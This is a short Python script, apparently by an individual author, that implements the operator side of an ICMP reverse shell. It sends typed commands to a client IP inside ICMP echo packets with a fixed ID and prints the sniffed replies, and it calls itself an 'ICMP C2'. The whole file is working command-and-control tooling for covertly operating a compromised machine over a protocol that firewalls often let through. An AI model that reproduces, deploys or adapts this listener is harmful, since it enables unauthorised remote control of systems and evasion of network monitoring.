#!/usr/bin/python
############################################################
# Requirements:
# pip install termcolor
# pip install scapy
############################################################

from termcolor import colored
from scapy.all import sr, IP, ICMP, Raw, sniff
import datetime
from multiprocessing import Process
import argparse
import os

NAME = "My-ICMP-Reverse-Shell-Listener"
VERSION = "1.0"
DATE = "02/06/2024"

ICMP_ID = int(1007)


def print_banner():
    """Print the banner."""
    print("")
    print(f"### {NAME}")
    print(f"### Version {VERSION}")
    print(f"### Date {DATE}")
    print("### by Bruno Botelho - bruno.botelho.br@gmail.com")
    print("")


def log_timestamp():
    """Return the current timestamp."""
    return datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")


def parse_arguments():
    """Parse and return arguments from the command line."""
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-d",
        "--destination",
        dest="destination",
        required=True,
        help="Client IP address",
    )
    return parser.parse_args()


def process(pkt):
    if (
        pkt[IP].src == parse_arguments().destination
        and pkt[ICMP].type == 0
        and int(pkt[ICMP].id) == ICMP_ID
        and pkt[Raw].load
    ):
        icmppacket = (pkt[Raw].load).decode("utf-8", errors="ignore").replace("\n", "")
        print(colored(icmppacket, "green"))
    else:
        pass


def sniffer():
    sniff(prn=process, filter="icmp", store=0)


def main():
    """Main function."""
    args = parse_arguments()
    print_banner()
    print("### Destination: " + colored(parse_arguments().destination, "green"))
    print("")
    sniffing = Process(target=sniffer)
    sniffing.start()
    print("Starting ICMP C2")
    print("Type 'exit' to stop the listener")
    print("")
    while True:
        icmpshell = input("")
        if icmpshell == "exit":
            print("[+]Stopping ICMP C2...")
            sniffing.terminate()
            break
        elif icmpshell == "":
            pass
        else:
            payload = (
                IP(dst=parse_arguments().destination)
                / ICMP(type=8, id=ICMP_ID)
                / Raw(load=icmpshell)
            )
            sr(payload, timeout=0, verbose=0)
    sniffing.join()


if __name__ == "__main__":
    main()
